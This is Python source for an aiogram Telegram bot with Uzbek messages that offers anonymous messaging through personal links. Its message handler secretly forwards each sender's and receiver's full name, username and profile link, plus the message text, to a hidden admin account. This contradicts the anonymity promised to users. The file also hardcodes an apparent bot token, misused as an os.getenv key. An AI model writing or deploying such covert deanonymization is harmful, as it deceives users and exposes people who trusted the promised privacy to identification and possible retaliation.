import asyncio
import sqlite3
import os
from aiogram import Bot, Dispatcher, F
from aiogram.types import Message
from aiogram.filters import CommandStart
from aiogram.enums import ParseMode
from aiogram.client.default import DefaultBotProperties

TOKEN = os.getenv("8747859987:AAHzmluAgIquFLZpjcFgEiwhIaMGSy3usRs")
ADMIN_ID = int(os.getenv("8140857589", "0"))

bot = Bot(token=TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher()

db = sqlite3.connect("database.db")
cursor = db.cursor()
cursor.execute("""
CREATE TABLE IF NOT EXISTS links (
    sender_id INTEGER,
    target_id INTEGER
)
""")
db.commit()

@dp.message(CommandStart())
async def start_handler(message: Message):
    user_id = message.from_user.id
    args = message.text.split()

    if len(args) > 1:
        target_id = int(args[1])
        if target_id == user_id:
            await message.answer("❌ O'zingizga yozib bo'lmaydi 🙂")
            return
        cursor.execute("INSERT INTO links VALUES (?, ?)", (user_id, target_id))
        db.commit()
        await message.answer("✍️ <b>Anonim xabaringizni yozing.</b>")
    else:
        link = f"https://t.me/Anonimxabarlarrbot?start={user_id}"
        await message.answer(
            f"✨ <b>Xush kelibsiz!</b>\n📎 Shaxsiy havolangiz:\n{link}\n📩 Havolani ulashing va anonim xabarlar oling."
        )

@dp.message(F.text | F.photo | F.video | F.voice)
async def handle_message(message: Message):
    user_id = message.from_user.id
    cursor.execute("SELECT target_id FROM links WHERE sender_id=?", (user_id,))
    result = cursor.fetchone()
    if not result:
        return

    target_id = result[0]

    if message.text:
        await bot.send_message(target_id, f"📩 Sizga yangi anonim xabar keldi!\n\n💬 {message.text}")
    elif message.photo:
        await bot.send_photo(target_id, message.photo[-1].file_id, caption="📩 Sizga anonim rasm keldi!")
    elif message.video:
        await bot.send_video(target_id, message.video.file_id, caption="📩 Sizga anonim video keldi!")
    elif message.voice:
        await bot.send_voice(target_id, message.voice.file_id, caption="📩 Sizga anonim ovozli xabar keldi!")

    await message.answer("✅ <b>Xabaringiz muvaffaqiyatli jo'natildi!</b>")

    sender = message.from_user
    receiver = await bot.get_chat(target_id)
    admin_text = (
        f"👀 <b>Yangi anonim xabar</b>\n\n"
        f"📤 <b>Yozgan:</b> {sender.full_name}\n"
        f"@{sender.username if sender.username else 'username yoq'}\n"
        f"<a href='tg://user?id={sender.id}'>Profilni ochish</a>\n\n"
        f"📥 <b>Qabul qilgan:</b> {receiver.full_name}\n"
        f"@{receiver.username if receiver.username else 'username yoq'}\n"
        f"<a href='tg://user?id={receiver.id}'>Profilni ochish</a>\n"
    )
    if message.text:
        admin_text += f"\n💬 {message.text}"

    await bot.send_message(ADMIN_ID, admin_text)

    cursor.execute("DELETE FROM links WHERE sender_id=?", (user_id,))
    db.commit()

async def main():
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
